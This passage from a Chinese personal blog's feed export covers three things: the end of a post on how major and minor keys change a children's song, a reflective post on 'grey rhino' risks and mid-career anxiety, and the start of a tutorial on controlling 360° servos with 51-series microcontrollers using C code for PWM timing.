10px 0 rgba(34,36,38,.08);zoom:30%;"     src="https://pic.gaficat.com/default/大调儿歌谱子.png">    <br>    <div style="color:orange; border-bottom: 1px solid #d9d9d9;    display: inline-block;    color: #999;    padding: 2px;">大调儿歌的谱子</div></br> </center>            <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css">            <script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script>            <div id="mmedia-bbRKBLsu" style="margin-bottom: 20px; width: "></div>        <script>          var ap_bbRKBLsu = new APlayer({            element: document.getElementById("mmedia-bbRKBLsu"),            narrow: false,            autoplay: false,            showlrc: false,            music: {              title: "基于大调的儿歌",              author: "官大为",              url: "https://music.gaficat.com/C%E5%A4%A7%E8%B0%83%E5%84%BF%E6%AD%8C.mp3",              pic: "",              lrc: ""            },            undefined          });          window.aplayers || (window.aplayers = []);          window.aplayers.push(ap_bbRKBLsu);        </script><p>基于小调的儿歌听起来是这样的：</p><center>    <img style="border-radius: 0.3125em;    box-shadow: 0 2px 4px 0 rgba(34,36,38,.12),0 2px 10px 0 rgba(34,36,38,.08);zoom:30%;"     src="https://pic.gaficat.com/default/小调儿歌谱子.png">    <br>    <div style="color:orange; border-bottom: 1px solid #d9d9d9;    display: inline-block;    color: #999;    padding: 2px;">小调儿歌的谱子</div></br> </center>            <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css">            <script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script>            <div id="mmedia-nhoyEbRy" style="margin-bottom: 20px; width: "></div>        <script>          var ap_nhoyEbRy = new APlayer({            element: document.getElementById("mmedia-nhoyEbRy"),            narrow: false,            autoplay: false,            showlrc: false,            music: {              title: "基于小调的儿歌",              author: "官大为",              url: "https://music.gaficat.com/C%E5%B0%8F%E8%B0%83%E5%84%BF%E6%AD%8C.mp3",              pic: "",              lrc: ""            },            undefined          });          window.aplayers || (window.aplayers = []);          window.aplayers.push(ap_nhoyEbRy);        </script><h1 id="尾巴"><a href="#尾巴" class="headerlink" title="尾巴"></a>尾巴</h1><p>我从小就开始学钢琴了，当然， 只是作为兴趣。和所有人一样，古典钢琴，学习的路径就是哈农、各种练习曲和大汤，自始至终，学钢琴对我而言都是极其枯燥的。当然了，父母有他们的说辞，小孩子哪里懂什么是兴趣，不逼你一下，你怎么可能学得出来？</p><p>但是当我成年，有了自学能力，能够自己做选择后发现：会一种乐器带给人的乐趣，不是你对于某种演奏的技艺有多高超（同一首曲子你弹100遍，腻不腻？）。而是我听到好听的歌曲，甚至于不需要谱子，能够用自己熟悉的乐器演奏、自弹自唱或是给别人弹伴奏，无论是钢琴、吉他、笛子、小提起或者是其他的乐器。对于音乐的喜爱，才是我们学习乐器的动力。但，从来没有人教我们，后来我知道了，这个东西叫乐理，叫视唱练耳，叫和声学。</p><p>和声学真的很有魅力，就像上面的儿歌，同一段音乐，仅仅变动了三个音，仅仅降低了半音，就能让一段旋律产生不一样的感情。如果把音乐比作语言，给你心爱的姑娘朗诵哈姆雷特，无论你朗诵的多么动人，多么熟练，心爱的姑娘只会拍拍手，朗诵的不错——这是古典钢琴，你的练习能让你的朗诵技巧很棒，音色很好听，但只是朗诵别人的作品。那如果是俏皮地念给她听你刚写的情诗呢？——这是即兴伴奏，这是和声学，教你写作，写自己的情诗。</p>]]></content>
    
    
    <categories>
      
      <category>音乐</category>
      
      <category>乐理</category>
      
    </categories>
    
    
    <tags>
      
      <tag>乐理</tag>
      
      <tag>音乐</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>今天想聊聊灰犀牛</title>
    <link href="/posts/c1d9e34b.html"/>
    <url>/posts/c1d9e34b.html</url>
    
    <content type="html"><![CDATA[<h1 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h1><p>人们用“黑天鹅”来比喻难以预测的极小概率事件。比如，泰坦尼克号、911等。<strong>而“灰犀牛”就是与“黑天鹅”互斥补充的概念，比喻的是经常被人视而不见的大概率风险。</strong>想象一下，在非洲大草原，一只体型庞大，行动迟缓、远远看起来似乎没有任何威胁的灰犀牛，正在慢悠悠散步，但当你毫无戒备地靠近它的领地，它被突然间激怒，向你狂奔而来，你便无处躲避。</p><a id="more"></a><h1 id="口水话环节"><a href="#口水话环节" class="headerlink" title="口水话环节"></a>口水话环节</h1><blockquote><p>周六，通勤的公交车依然有很多人，到达公司，发现我所在的楼层只有我一个。呵，挺新奇，竟然只有我一个人加班。最近降温很厉害，我整个人蜷缩着，昨天那股“半天干完活就回家”的意愿早就不知道跑哪儿去了。在公司就看看bilibili，刷刷v2ex，再点几个经常浏览的网站，一上午时间就过去了。吃了饭，本来心想回去休息半个小时，就开始干活儿，工作量不小呢！结果想到那么多的事情没做，一点动力都没有，午休起来都下午四点了。得，去上个厕所，结果回来发现忘带门卡，被锁在了门外了，钥匙也在里面，家也回不去了。就这么一瞬间，我有些崩溃了，一屁股坐在公司门口，心想自己怎么就活成这个窝囊样。自己这个萎靡不振样子，有一些像丢了钱包的江阳。</p><p>国考前几天开始报名了，看了看职位表，就马上一通操作猛如狗，然后，一个能报的都没有。我想到各种35岁危机的说法，有些不安。又想到女票的父母因为自己不是公务员，不太愿意让女票跟自己相处。满脑子就只有一个念头：“这世道，除了公务员，就不配活着了呗？除了公务员，所有人35岁之后就都去送外卖，当保安了呗？所有职业都低公务员一等呗？”但，呵？你还挺高兴，不愿意考公务员？你看看你有资格考试不？</p></blockquote><p>我最近过的有些焦虑，一方面，我已经参加工作快三年了，跟同事聊天，发现大家到了这个时间点，都有些疲倦、迷茫了，对手头的工作提不起兴趣。另一方面，想到自己可能遭遇35岁的危机，挺无能为力。那怎么办呢？正在做的工作似乎已经触及行业的天花板了，大幅的加薪很困难。自己的兴趣很难在短期内转化成变现的能力。就连参加铁饭碗考试的资格都没有。怎么办呢？</p><p>前段时间，看到一个关于灰犀牛的视频，想想自己的现状，嗯，记录下来吧，当作是读书笔记了。</p><h1 id="什么是灰犀牛？"><a href="#什么是灰犀牛？" class="headerlink" title="什么是灰犀牛？"></a>什么是灰犀牛？</h1><p>说到灰犀牛，就一定要提到它的反义词——“黑天鹅”。</p><blockquote><p>据说在十七世纪以前，欧洲人只见过白色的天鹅，所以他们就认为全世界的天鹅都是白色的。后来随着他们开发澳大利亚，在当地看见第一只黑色的天鹅起，这个原本看似绝不可动摇的信条就给彻底颠覆了。此即所谓的“黑天鹅事件”，它原意旨在说明，人类总是过度地相信经验，殊不知一只黑天鹅的出现，就足以颠覆以往的认知。</p></blockquote><p>后来，人们用<strong>“黑天鹅”来比喻难以预测的极小概率事件</strong>。比如，泰坦尼克号、911等。<strong>而“灰犀牛”就是与“黑天鹅”互斥补充的概念，比喻的是经常被人视而不见的大概率风险。</strong></p><blockquote><p>想想一下，在非洲大草原，一只体型庞大，行动迟缓、远远看起来似乎没有任何诶西安的灰犀牛，正在慢悠悠散步，但当你毫无戒备地靠近它的领地，它被突然间激怒，向你狂奔而来，你便无处躲避。</p></blockquote><p>与难以预测的“黑天鹅”不同，<strong>灰犀牛式的重大危机往往早就呈现出各种端倪。</strong></p><h1 id="应对灰犀牛时的五个阶段"><a href="#应对灰犀牛时的五个阶段" class="headerlink" title="应对灰犀牛时的五个阶段"></a>应对灰犀牛时的五个阶段</h1><ul><li>抵制否认阶段</li><li>混日子阶段</li><li>判断性质阶段</li><li>惊恐阶段</li><li>行动阶段或崩溃阶段</li></ul><h2 id="抵制否认阶段"><a href="#抵制否认阶段" class="headerlink" title="抵制否认阶段"></a>抵制否认阶段</h2><p><strong>人们会拒绝承认不安的事实，这是一种自我保护机制。</strong>比如我们的父母，逐渐衰老，身体会出现各种各样的小毛病，但当我们提出，带他们去体检时，他们的第一反应往往都是，“我身体好着呢，不需要体检”。</p><blockquote><p>我们小时候，暑假就只顾着玩，到了快开学发现作业没写完，咋办？肯定是先否定，我咋可能啥也没写，肯定写了一些的，差的不多。</p></blockquote><h2 id="混日子阶段"><a href="#混日子阶段" class="headerlink" title="混日子阶段"></a>混日子阶段</h2><p><strong>这一阶段，人们往往会得过且过，想办法把问题推到将来。</strong>想想我们自己吧，一边被各种贩卖焦虑搞得真的挺焦虑，35岁怎么办，一方面每天按部就班，回到家，抖音、微博、知乎刷不停，得过且过，就混呗。</p><blockquote><p>否定完，然后就心想，反正还有几天，往后拖吧，最后几天再补。</p></blockquote><h2 id="判断性质阶段"><a href="#判断性质阶段" class="headerlink" title="判断性质阶段"></a>判断性质阶段</h2><p><strong>这一阶段，人们往往会对灰犀牛危机的性质进行判断，并会对该做什么进行争吵，从而浪费大量的时间和绝佳的机会。</strong></p><blockquote><p>混着混着，到了快开学的前几天，就该判断性质了，到底差了多少没写，要不要补，先补哪个。</p></blockquote><h2 id="惊恐"><a href="#惊恐" class="headerlink" title="惊恐"></a>惊恐</h2><p><strong>这一阶段有多惊恐，取决于我们在前面三个阶段浪费了多少时间。</strong></p><blockquote><p>判断完性质，可不就挺惊恐麽。天老爷，差这么多没写，咋整？</p></blockquote><h2 id="行动阶段或崩溃阶段"><a href="#行动阶段或崩溃阶段" class="headerlink" title="行动阶段或崩溃阶段"></a>行动阶段或崩溃阶段</h2><p><strong>惊恐过后，行动阶段和崩溃阶段往往是同时存在的。</strong></p><blockquote><p>最后，只能一把鼻涕一把泪，熬夜写作业呗？当然也有那种欠太多，死猪不怕开水烫，崩溃等死的时候。</p></blockquote><h1 id="如何应对灰犀牛？"><a href="#如何应对灰犀牛？" class="headerlink" title="如何应对灰犀牛？"></a>如何应对灰犀牛？</h1><ul><li>承认危机的存在</li><li>判断灰犀牛事件的性质</li><li>动起来</li><li>不要浪费危机</li><li>成为发现并控制灰犀牛式危机的人</li></ul><h2 id="承认危机的存在"><a href="#承认危机的存在" class="headerlink" title="承认危机的存在"></a>承认危机的存在</h2><p><strong>承认危机，就要时刻防范群体思维，并以接受的态度对待不同的声音和观点。</strong>我认为做到这一点是相当困难的，首先，我们天生就有群体思维，比如法不责众，大家都是那样的， 我就跟着大家就行。那么，在这种情况下，能够跳出群体思维，对事情本身进行思考，保持自己的想法就非常困难了。其次，我们在面对自己不利的东西时，会本能地编造出一万种理由逃避，试图自欺欺人，拒绝自己意识到的危机。</p><h2 id="判断灰犀牛事件的性质"><a href="#判断灰犀牛事件的性质" class="headerlink" title="判断灰犀牛事件的性质"></a>判断灰犀牛事件的性质</h2><p><strong>判断灰犀牛事件的性质，分析事情的起因，列出Todo</strong>。承认危机的存在后，要立即处理所有的危机一定很难。所以需要有这样一个阶段，给自己思考的时间，好好想想事情的原因是什么，应该怎么做，并衡量各种Todo的轻重缓急，制定应对灰犀牛的方案。</p><h2 id="动起来"><a href="#动起来" class="headerlink" title="动起来"></a>动起来</h2><p><strong>一定要动起来，动起来不一定能解决问题，但混日子、等待一定解决不了问题。</strong>行动、解决问题也是一件很困难的事情，我们因为不擅长或者其他原因，才造成了灰犀牛危机，那么要解决它势必很困难，否则就不会出现灰犀牛了。当我们感觉Todo非常困难时，可以想想哪一些比较小的举措可以做。但无论如何，一定要动起来。也可以自己制定一种流程，当恐惧、惰性阻止自己行动时，能强迫自己向前。</p><h2 id="不要浪费危机"><a href="#不要浪费危机" class="headerlink" title="不要浪费危机"></a>不要浪费危机</h2><p><strong>乱世出英雄，请抓住我们经历的“乱世”，无论任何危机，总会有人能获益。</strong>有时候灾难是无法避免的，阻止危机的最佳时机，可能就是灾难发生之后。当所有人都心怀恐惧，不敢动弹时，我们如果能立刻振作起来，抓住这次危机，也许会有意想不到的机遇。</p><h2 id="成为发现并控制灰犀牛式危机的人"><a href="#成为发现并控制灰犀牛式危机的人" class="headerlink" title="成为发现并控制灰犀牛式危机的人"></a>成为发现并控制灰犀牛式危机的人</h2><p><strong>敢于同大多数人背道而驰，愿意激励他人一起行动。</strong>成为这样的人，需要大量的训练。虽然我们不知道灰犀牛式危机，会在什么时候以什么方式降临，但我们依然能够尽力防范。比如给住宅配备消防用品、上车系安全带、多学习新的知识、锻炼身体等等。这些看起来不足为奇的举动，往往能让我们扛过灰犀牛的危机。</p><h1 id="尾巴"><a href="#尾巴" class="headerlink" title="尾巴"></a>尾巴</h1><p>每一只负面的黑天鹅都是由许许多多的灰犀牛聚集而成的，真正的危险往往就在我们身边，常常被我们忽视。但往往最危险的，就是这些灰犀牛，因为当头一棒的黑天鹅逼迫你必须去做一些事，而看似无关紧要的灰犀牛，等真正积累，出现大问题的时候，往往焦虑不已，而行动或是崩溃，往往就在一念之间。如果我们能积极应对每一个灰犀牛，那么对我们不利的很多黑天鹅，很可能就被扼杀在摇篮中了。</p><p>35岁焦虑，是我们当代年轻人必然的问题。体制外的羡慕体制内的想进去。体制内的，不甘心永远在基层给别人打工，想着努力晋升当领导。当领导的，行事谨慎，担心扫黑除恶，反腐倡廉，羡慕体制外生意人的自由。人人都有焦虑，但重要的是，承认35岁会遇到的灰犀牛后，无论通过自己，或是另一半、父母，不要过度焦虑，坦然、积极接受遇到的危机并真的动起来。只有动起来，才有好起来的可能吧！</p><h1 id="原视频"><a href="#原视频" class="headerlink" title="原视频"></a>原视频</h1>        <style>.bbplayer{width: 100%; max-width: 850px; margin: auto}</style>        <div class="bbplayer">        <iframe class="bbplayer" id="mmedia-oflTYcJk" src="//player.bilibili.com/player.html?bvid=BV1pz4y1o74P&page=1&high_quality=1&danmaku=false"            allowfullscreen="no"            scrolling="no" frameborder="0" sandbox="allow-top-navigation allow-same-origin allow-forms allow-scripts allow-popups"></iframe>        </div>        <script>            document.getElementById("mmedia-oflTYcJk").style.height=document.getElementById("mmedia-oflTYcJk").scrollWidth*0.76+"px";            window.onresize = function(){              document.getElementById("mmedia-oflTYcJk").style.height=document.getElementById("mmedia-oflTYcJk").scrollWidth*0.76+"px";            };        </script>        ]]></content>
    
    
    <categories>
      
      <category>奇怪的知识</category>
      
    </categories>
    
    
    <tags>
      
      <tag>奇怪的知识</tag>
      
      <tag>生活</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>如何用51单片机控制舵机加减速</title>
    <link href="/posts/5d933848.html"/>
    <url>/posts/5d933848.html</url>
    
    <content type="html"><![CDATA[<p>本文介绍使用如何51单片机控制舵机转动、加减速。</p><a id="more"></a><h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><blockquote><p>这边文章是2016年上大学的时候写的，当时还不太懂做一个自己的网站，这篇文章写在了新浪博客上，排版阅读体验极差，重新把他整理处理出来，我的网站SEO还行，希望帮助更多人吧。</p></blockquote><p>关于舵机，网络和书本上，很难找到详细的资料，我在2015年准备中国工程机器人暨国际公开赛的时候，做了一个采用舵机驱动的车型搬运机器人。由于当时知识有限，使用90系列51单片机，无法生成满足舵机精度要求的PWM，导致一个舵机的控制问题花费了近半年时间，并没有按照预期参加比赛（这个也真的不怪谁，不走个弯路）。</p><p>关于舵机的控制，我查询过一些资料，也请教过实验室的老师，但是结果都很不满意。舵机乱转，转速控制不精确，出现过各种问题。最终，硬是通过砸钱和砸时间（20块一个的PWM调制器不知道烧了多少- -！这个反正烧的不是我的，不心疼，但是90块一个舵机，加上60块一个的航模PWM舵机调制器还是砸了几百块进去的），和小伙伴通过实验，反复测试得到的结果，在这里分享出来，希望能帮助到感兴趣的铁子们。</p><h1 id="舵机VS减速电机"><a href="#舵机VS减速电机" class="headerlink" title="舵机VS减速电机"></a>舵机VS减速电机</h1><p>我们知道，普通的减速电机也能转，舵机也能转，那这两个玩意儿有什么区别？</p><p>舵机，按照转动的方式，可以分为180°和360°连续旋转舵机。</p><ul><li><p>180°舵机，顾名思义，就是只能旋转180°的舵机，我们可以通过PWM，精确的控制舵机旋转的角度。舵机从0°转到180°就不能继续转了，只能往回去转。另外，180°舵机无法调速，就是说，他始终会以最快速度，朝着你设定的角度旋转，直到旋转到目标角度刹停。因此，180°舵机在航模（控制飞机机翼）、双足机器人等很多场景中都有使用。</p></li><li><p>360°连续旋转舵机，顾名思义，就是可以朝着顺时针或者逆时针的方向，按照一定的速度一直转。可以通过PWM，控制舵机的旋转方向和速度，因此，也常常用于车型机器人的驱动上。360°舵机是无法控制旋转的角度的，只可以控制转和停、正转和反转以及转速。</p><center>    <img style="border-radius: 0.3125em;    box-shadow: 0 2px 4px 0 rgba(34,36,38,.12),0 2px 10px 0 rgba(34,36,38,.08);zoom:40%;"     src="https://pic.gaficat.com/default/舵机.jpeg">    <br>    <div style="color:orange; border-bottom: 1px solid #d9d9d9;    display: inline-block;    color: #999;    padding: 2px;">360°舵机</div></br> </center></li></ul><p>减速电机，其实类似于360°连续旋转舵机，也常用小车的动力，就通电就一直转呗，断电就停呗。一般在某宝上面买的什么寻迹机器人，都是使用的减速电机。</p><center>    <img style="border-radius: 0.3125em;    box-shadow: 0 2px 4px 0 rgba(34,36,38,.12),0 2px 10px 0 rgba(34,36,38,.08);zoom:60%;"     src="https://pic.gaficat.com/default/ 减速电机.jpg">    <br>    <div style="color:orange; border-bottom: 1px solid #d9d9d9;    display: inline-block;    color: #999;    padding: 2px;">减速电机</div></br> </center><p>减速电机和舵机的区别是：</p><ul><li>硬件上：由于舵机内置有电路，因此我们做机器人设计电路的时候，仅需要设计好阴阳极和PWM信号输入的接口，非常简单。而普通的减速电机在设计电路的时候，则需要考虑到驱动芯片，就比较复杂了。淘宝上有现成的l298n驱动模块，买回来可以直接用了。</li><li>控制难度上，舵机对于PWM的精度要求非常高，而电机相对就不高。</li><li>价格方面：通常来说，舵机的价格是普通减速电机的很多倍，就记得之前带一个中学的学生参加机器人比赛，结果土豪学校用的舵机是300块一个的磁传感舵机。一个机器人，四个轮子就1200出去了，真的有钱。</li><li>转动效果上：减速电机转速高，扭矩小（说人话，如果车轻，跑的飞快，车重就跑不动）。舵机通常转速一般，扭矩大（说人话，车重车轻影响不大，始终能以一个固定的最大速度跑）。</li><li>个人认为最核心的差别：<strong>舵机是带刹停的。</strong>什么意思？如果减速电机需要停止转动，那就断电呗。但是假如一个小车在斜坡上，那减速电机就很难让小车刹住，断电就滑下去了嘛。反观舵机就比较容易实现了，只需要给一个固定的PWM就能刹住了。因为舵机的停，实际上是通电的，舵机本身是有力量保持住停止的这个状态的。<strong>快速响应的拖刹，给定高电平1.5ms的pwm，舵机会立刻刹住以及其充沛的动力这一点是减速电机做不到的。</strong></li></ul><h1 id="PWM"><a href="#PWM" class="headerlink" title="PWM"></a>PWM</h1><p>上一段中，我提到可以通过PWM，控制舵机转动。咱不做百度百科的搬运工，复制一堆看不懂的东西去解释概念。这里，只要知道，控制舵机，输出一个周期为20ms-30ms（最好20ms），高电平为0.5ms-2.5ms的信号即可，这个信号具体控制舵机的范围如下：</p><ul><li><strong>对于180°舵机而言，PWM高电平0.5-2.5ms每一个值对应一个角度，比如0.5ms对应转动到0°的位置，那1.5ms就对应转动到90°的位置，那2.5ms就对应转动到180°的位置。</strong></li><li><strong>对于360°舵机而言，PWM高电平0.5-1.5ms为正转区间，1.5-2.5ms为反转区间，1.5ms为舵机刹车点，调速的区间通常在1.5ms左右0.1ms宽度的范围内。</strong>举个例子，我使用的舵机，高电平0.5ms-1.37ms为以最大速度正转，正转的调速高电平区间为1.37ms-1.47ms（高电平越靠近1.5ms，舵机转速越慢），高电平1.53ms-2.5ms为以最大速度反转，反转调速高电平区间为：1.53-1.63ms（高电平越靠近1.5ms，舵机转速越慢），刹车高电平区间为：1.47-1.53ms。</li></ul><center>    <img style="border-radius: 0.3125em;    box-shadow: 0 2px 4px 0 rgba(34,36,38,.12),0 2px 10px 0 rgba(34,36,38,.08);zoom:80%;"     src="https://pic.gaficat.com/default/PWM.jpeg">    <br>    <div style="color:orange; border-bottom: 1px solid #d9d9d9;    display: inline-block;    color: #999;    padding: 2px;">PWM示意图</div></br> </center><p>关于硬件上的设计，无非是保证供电的稳定和预留出PWM的接口，这里就不详细说明了，这里附上一张原理图，感兴趣的小伙伴可以研究一下。如果舵机反向电流很大，建议加上光耦隔离。</p><center>    <img style="border-radius: 0.3125em;    box-shadow: 0 2px 4px 0 rgba(34,36,38,.12),0 2px 10px 0 rgba(34,36,38,.08);zoom:50%;"     src="https://pic.gaficat.com/default/舵机控制原理图.jpeg">    <br>    <div style="color:orange; border-bottom: 1px solid #d9d9d9;    display: inline-block;    color: #999;    padding: 2px;">舵机控制原理图</div></br> </center><h1 id="STC90系列能控制360°舵机吗？"><a href="#STC90系列能控制360°舵机吗？" class="headerlink" title="STC90系列能控制360°舵机吗？"></a>STC90系列能控制360°舵机吗？</h1><p>这里对360°舵机如果通过51单片机的程序进行控制做详细的说明。如何使用51单片机产生我们需要的PWM？用定时器嘛！当然，我一开始也是这么想的，看看下面这段程序：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;reg51.h&gt;</span></span><br><br><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> i=<span class="hljs-number">1</span>;<br><span class="hljs-keyword">int</span> n;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">ste360</span><span class="hljs-params">(n)</span></span>&#123;<br>  TMOD=<span class="hljs-number">0X01</span>;<br>  TL0=<span class="hljs-number">0XF6</span>; <span class="hljs-comment">// 0.01ms</span><br>  TH0=<span class="hljs-number">0XFF</span>;<br>  TR0=<span class="hljs-number">1</span>;<br>  EA=<span class="hljs-number">1</span>;<br>  ET0=<span class="hljs-number">1</span>;<br>  P1=<span class="hljs-number">0X00</span>; <br><span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>);<br>&#125;<br><br><span class="hljs-keyword">void</span> _pwm() interrupt <span class="hljs-number">1</span> &#123;<br>  TH0=<span class="hljs-number">0xff</span>; <span class="hljs-comment">// 0.01ms</span><br>  TL0=<span class="hljs-number">0xF6</span>;<br>i++;<br><br><span class="hljs-keyword">if</span>(i&lt;=n)&#123;<br>P1=<span class="hljs-number">0XFF</span>; <span class="hljs-comment">// 1.37&lt;&lt;1.47-1.54&lt;&lt;1.63</span><br>&#125; <span class="hljs-keyword">else</span> P1=<span class="hljs-number">0x00</span>;<br><br><span class="hljs-keyword">if</span>(i&gt;=<span class="hljs-number">2000</span>)&#123;<br>i=<span class="hljs-number">1</span>;<br>&#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>看起来程序好像没有什么问题，ste360(n)这个函数，n就可以控制pwm高电平的时间，我设定定时器为每0.01ms进入一次中断，所以，要想得到1.5ms高电平，是不是n填写150就行了？答案是否定的，虽然程序逻辑是没有问题的，计算出来确实是1.5ms，但是现实中，很有可能是高电平为3ms+，为什么？这个问题困惑了我挺久，我和一位学长也讨论过，他认为：编译过程中，会将我们写的c文件，编译成汇编文件，然后转成机器语言，这个过程中可能会有误差。而我觉得，主要是晶振本身是有误差，其次，这样反复的进入中断，细小的误差会被无限的放大。最后，可能STC90系列的单片机设计有缺陷？我也不确定。因为同样是使用c，stm32上pwm的精度高的离谱。所以，使用STC90系列单片机（所有只有8位定时器的51单片机）来控制舵机，在我看来，是完全不可行的（我在很长一段时间里，极力优化代码，尝试过各种思路，但是结果只能说有提升，但是远远达不到控制舵机的要求）。当然了，还是要有点朋克精神，铁子们也可以自己写点小程序，打在示波器上看看，STC90系列的单片机能不能生成满足精度要求的PWM。</p><h1 id="STC12系列能控制360°舵机吗？"><a href="#STC12系列能控制360°舵机吗？" class="headerlink" title="STC12系列能控制360°舵机吗？"></a>STC12系列能控制360°舵机吗？</h1><p>不能用定时器，那怎么办？stc12系列的51单片机是自带8位pwm波形发生器，是不是可以用12系列的单片机实现？看程序：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;reg51.h&gt;</span></span><br><br>sfr CCON=<span class="hljs-number">0xD8</span>;<br><span class="hljs-comment">//CF CR - - | - - CCF1 CCF0</span><br><span class="hljs-comment">//-----------------------------</span><br><span class="hljs-comment">//CF:PCA计数阵列溢出标志.计数值翻转时由硬件置位。</span><br><span class="hljs-comment">//CR:PCA计数阵列运行控制位。</span><br><span class="hljs-comment">//CCF1:PCA模块1中断标志。当出现匹配或者捕获时由硬件置位。</span><br><span class="hljs-comment">//CCF0:PCA模块0中断标志。当出现匹配或者捕获时由硬件置位。</span><br>           /<br>sfr CCAP0L=<span class="hljs-number">0xEA</span>;<span class="hljs-comment">//PCA模块0的捕捉/比较寄存器低8位</span><br>sfr CCAP0H=<span class="hljs-number">0xFA</span>;<span class="hljs-comment">//PCA模块0的捕捉/比较寄存器高8位</span><br><br>sfr CCAPM0=<span class="hljs-number">0xDA</span>;<span class="hljs-comment">//PCA模块0的工作模式寄存器</span><br><span class="hljs-comment">//---------------------------------------</span><br><span class="hljs-comment">//7   6   5     4     3   2    1    0</span><br><span class="hljs-comment">//- ECMn CAPPn CAPNn MATn T0Gn PWMn ECCFn</span><br><span class="hljs-comment">//----------------------------------------</span><br><span class="hljs-comment">//ECOMn:使能比较器，1时使能比较器功能</span><br><span class="hljs-comment">//CAPPn：正捕获，1时使能上升沿捕获</span><br><span class="hljs-comment">//CAPNn：负捕获，1时使能下降沿捕获</span><br><span class="hljs-comment">//MATn:匹配:1时，PCA计数器的值与模块的比较/捕获寄存器的值匹配将置位CCON寄存器中断标志位CCFn</span><br><span class="hljs-comment">//T0Gn:翻转，1时，工作在PCA告诉输出模式，PCA计数器的值与模块的比较/捕获寄存器的值匹配将是CEXn脚翻转</span><br><span class="hljs-comment">//PWMn:脉宽调节输出模式，1时，使能CEXn脚用做PWM输出</span><br><span class="hljs-comment">//EECFn:使能CCFn中断，使能寄存器CCON中的捕获/比较标志CCFn，用来产生中断</span><br>sfr PCA_PWM0=<span class="hljs-number">0xF2</span>;<span class="hljs-comment">//PCA模块0,PWM寄存器</span><br><span class="hljs-comment">//-----------------------------------</span><br><span class="hljs-comment">//        7 6 5 4   3 2   1    0   </span><br><span class="hljs-comment">//PCA_PWMn:- - - - | - - EPCnH EPCnL</span><br><span class="hljs-comment">//-----------------------------------</span><br>sfr CCAP1L=<span class="hljs-number">0xEB</span>;<br>sfr CCAP1H=<span class="hljs-number">0xFB</span>;<br>sfr CCAPM1=<span class="hljs-number">0xDB</span>;<br>sfr PCA_PWM1=<span class="hljs-number">0xF3</span>;<span class="hljs-comment">//</span><br>sbit CR=<span class="hljs-number">0xDE</span>;<span class="hljs-comment">//因为只有能和8整除的才能位寻址，所以能些0xDE，看起来有冲突，实际上不会。</span><br>sfr AUXR1=<span class="hljs-number">0xA2</span>;<span class="hljs-comment">//PWM引脚位置 串口2位置 双DPTR选择 AD转换结果存放方式调整 SPI位置调整</span><br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">ini_T0</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    